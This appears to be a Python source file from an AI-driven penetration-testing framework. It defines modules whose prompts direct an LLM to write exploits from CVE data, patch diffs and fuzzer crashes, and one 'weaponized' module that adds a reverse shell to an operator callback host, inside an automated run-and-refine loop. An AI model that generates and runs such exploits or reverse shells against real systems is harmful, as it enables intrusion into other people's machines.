"""Attack modules: synthesis."""

from __future__ import annotations

from tools.attack_modules.base import AttackModule, ModuleContext
from typing import Any

class CVEToExploit(AttackModule):
    name = "CVEToExploit"
    description = "Feed CVE description + affected version to LLM to synthesize a novel exploit script"
    target_services = ["http", "https", "ssh", "smb", "microsoft-ds", "rdp", "ms-wbt-server"]
    target_ports = [80, 443, 22, 445, 3389]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Takes a CVE ID, fetches its NVD description + references, and prompts "
                "the LLM to generate a working Python exploit. Advisory: the LLM "
                "produces the script (via write_python_file), not the module. "
                "Prefer the executable cve_to_exploit_synth MCP tool which emits "
                "CVE-family template skeletons + inline syntax verification."
            ),
            evidence=[f"CVE-to-exploit synthesis queued for {len(ctx.cves)} CVEs against {ctx.target_ip}"],
            references=["https://nvd.nist.gov/", "https://github.com/advisories"],
            workflow=[
                "1. Call search_cve_intel(cve_id) to get CVE details",
                "2. Call search_web_exploit(cve_id) to find public PoCs",
                "3. Use write_python_file to save the AI-generated exploit",
                "4. Use run_python_file to test against target",
                "5. If it fails, use the error output to refine the exploit",
            ],
            prompt_template=(
                "You are an exploit developer. Based on the CVE details below, write a complete "
                "Python exploit script that tests whether the target is vulnerable.\n\n"
                "CVE DETAILS (append the fetched NVD description + references here):\n"
                "<CVE_DETAILS/>\n\n"
                "Use only standard library imports (socket, ssl, http, urllib, struct, json, "
                "base64, hashlib, argparse, sys). The script must accept the target as "
                "sys.argv[1] (bare positional) AND --target <ip> (use argparse.parse_known_args() "
                "so the bare positional is tolerated), plus --port <port>. It MUST only connect "
                "to --target; do NOT connect to any other host.\n"
                "Print EXACTLY one canonical marker on its own line:\n"
                "  - On success: COMPROMISE: vulnerability_confirmed target=<target_ip>\n"
                "  - On failure: VULN_NOT_CONFIRMED: <one-line reason>\n"
                "These markers are parsed by the agent loop to classify the outcome -- do not omit or reword them.\n"
                "Return ONLY raw Python code -- NO markdown fences, NO explanations."
            ),
        )

class DiffPatchAnalysis(AttackModule):
    name = "DiffPatchAnalysis"
    description = "Given a security patch diff, reverse-engineer the vulnerability and generate an exploit"
    target_services = ["http", "https", "ssh", "smb", "microsoft-ds"]
    target_ports = [80, 443, 22, 445]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Analyzes git diff / patch files to identify the vulnerable code path "
                "and synthesize an exploit. Advisory: the LLM produces the analysis "
                "JSON (with poc_code) from the appended diff. Fetch the patch via "
                "git diff / curl of the NVD reference URL."
            ),
            evidence=[f"patch-diff analysis queued for {len(ctx.cves)} CVEs against {ctx.target_ip}"],
            references=["https://nvd.nist.gov/", "https://github.com/advisories"],
            workflow=[
                "1. Obtain patch diff (from GitHub security advisory, commit, or CVE reference)",
                "2. Identify the changed code — what was added/removed?",
                "3. Determine the vulnerability class (buffer overflow, injection, auth bypass, etc.)",
                "4. Generate a Python exploit targeting the vulnerable code path",
                "5. Test against target with write_python_file + run_python_file",
            ],
            analysis_prompt=(
                "You are an exploit developer analyzing a security patch diff.\n\n"
                "PATCH DIFF (append the diff here):\n"
                "<DIFF/>\n\n"
                "Produce your analysis as a single JSON object (no prose, no markdown fences):\n"
                "{\n"
                "  \"vulnerability_fixed\": \"short name of the vuln being fixed\",\n"
                "  \"vulnerable_code_path\": \"where the bug lives (file:func, approx)\",\n"
                "  \"root_cause\": \"one-paragraph root cause\",\n"
                "  \"trigger\": \"how an attacker could trigger it\",\n"
                "  \"exploit_payload_shape\": \"what the exploit payload would look like\",\n"
                "  \"poc_code\": \"complete Python PoC script that accepts --target <ip> and --port <port> "
                "via argparse.parse_known_args(), connects ONLY to --target, and prints one marker on its "
                "own line: 'COMPROMISE: vulnerability_confirmed target=<target_ip>' on success, or "
                "'VULN_NOT_CONFIRMED: <reason>' on failure. Use only stdlib imports.\"\n"
                "}\n"
                "Return ONLY the JSON object."
            ),
        )

class FuzzToExploit(AttackModule):
    name = "FuzzToExploit"
    description = "Feed crash/fuzz output to LLM to generate exploitation scripts from crash data"
    target_services = ["http", "https", "ssh", "smb", "microsoft-ds"]
    target_ports = [80, 443, 22, 445]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Takes crash output (segfault, ASAN report, exception trace) and prompts "
                "LLM to build an exploit. Advisory: the LLM produces the trigger/delivery "
                "script from the appended crash context. Requires a crash artifact from "
                "an external fuzzer run (AFL++/libFuzzer) -- manually invoked."
            ),
            evidence=[f"fuzz-to-exploit synthesis queued for {ctx.target_ip} (crash input required)"],
            references=["https://aflplus.plus/", "https://llvm.org/docs/LibFuzzer.html"],
            workflow=[
                "1. Run fuzzer against target service (AFL++, libFuzzer, or custom Python fuzzer)",
                "2. Capture crash output with registers, stack trace, and faulting instruction",
                "3. Feed crash context to LLM: 'Given this crash, write a Python ROP exploit'",
                "4. Generate exploit with write_python_file and test with run_python_file",
            ],
            crash_prompt=(
                "You are an exploit developer. Given the crash information below, determine the "
                "exploitation strategy and write a Python exploit.\n\n"
                "CRASH INFORMATION (append the crash output / registers / stack trace here):\n"
                "<CRASH_INFO/>\n\n"
                "Analyze: (1) what type of vulnerability caused the crash (buffer overflow, "
                "use-after-free, etc.), (2) which register/IP is controlled (if the crash output "
                "contains register state; if not, say \"unknown\" and proceed with a trigger/delivery "
                "script anyway), (3) the exploitation strategy. For a remote service, a pure "
                "socket/struct Python script can deliver the trigger and confirm crash control; if a "
                "full ROP chain is required, document the chain in comments and implement the "
                "trigger/delivery portion in Python.\n"
                "The script must accept --target <ip> and --port <port> via argparse.parse_known_args(), "
                "connect ONLY to --target, use only stdlib imports, and print one canonical marker on "
                "its own line:\n"
                "  - On success: COMPROMISE: crash_controlled target=<target_ip>\n"
                "  - On failure: VULN_NOT_CONFIRMED: <one-line reason>\n"
                "Return ONLY raw Python code -- NO markdown fences, NO explanations."
            ),
        )


class WeaponizedExploit(AttackModule):
    name = "WeaponizedExploit"
    description = "Weaponized CVE-to-exploit: synthesize a Python exploit that verifies vulnerability AND gains code execution (reverse shell to an operator callback host)"
    target_services = ["http", "https", "ssh", "smb", "microsoft-ds", "rdp", "ms-wbt-server"]
    target_ports = [80, 443, 22, 445, 3389]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Weaponized CVE synthesis. Fetches CVE intel + public PoCs, then prompts the LLM "
                "to write a Python exploit that both verifies the vulnerability AND gains execution "
                "via a reverse shell to an operator-supplied callback host. On success the generated "
                "script prints a canonical COMPROMISE marker so the agent loop can confirm foothold. "
                "The callback host must be in exploit.allowed_targets (target-IP lock)."
            ),
            evidence=[f"weaponized synthesis queued for {len(ctx.cves)} CVEs against {ctx.target_ip}"],
            references=["https://nvd.nist.gov/", "https://github.com/advisories"],
            workflow=[
                "1. Call search_cve_intel(cve_id) to fetch NVD description, references, and affected versions",
                "2. Call search_web_exploit(cve_id) to gather public PoCs and exploit code fragments",
                "3. Use write_python_file to save the weaponized exploit (target-locked to ctx.target_ip; reverse shell connects only to the operator callback host passed as --callback-host/--callback-port)",
                "4. Use run_python_file with --target ctx.target_ip --port <service_port> --callback-host <operator_cb> --callback-port <operator_cb_port>",
                "5. On success the script prints the canonical marker: 'COMPROMISE: reverse_shell_established target=<ip> callback=<cb_host>:<cb_port>'",
                "6. If verification fails, feed stderr back to the LLM and regenerate with mutated parameters (mutate_exploit)",
            ],
            prompt_template=(
                "You are an exploit developer in an authorized pentest against a single owned target. "
                "Based on the CVE details and PoC fragments below, write a COMPLETE weaponized Python "
                "exploit that (1) verifies the target is vulnerable, AND (2) gains code execution by "
                "establishing a reverse shell to an operator-controlled callback host. Constraints: "
                "use only standard library imports (socket, ssl, http, urllib, struct, json, base64, "
                "hashlib, subprocess, os, sys, threading, argparse). The script MUST accept the target as "
                "sys.argv[1] (bare positional) AND --target <ip> (use argparse.parse_known_args() so "
                "the bare positional is tolerated), plus --port <port> --callback-host <operator_cb_ip> "
                "--callback-port <operator_cb_port>. "
                "It MUST only ever connect to --target (the single authorized target IP) "
                "and to --callback-host (the operator's own listener). It MUST NOT connect to any "
                "other host. On successful reverse-shell establishment, print EXACTLY on its own line: "
                "'COMPROMISE: reverse_shell_established target=<target> callback=<cb_host>:<cb_port>'. "
                "On failure, print EXACTLY on its own line: 'VULN_NOT_CONFIRMED: <one-line reason>'. "
                "These markers are parsed by the agent loop to classify the outcome -- do not omit or "
                "reword them. Do NOT cause denial of service; the exploit must be non-destructive to "
                "target availability."
            ),
            expected_shell_type="reverse",
        )


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------

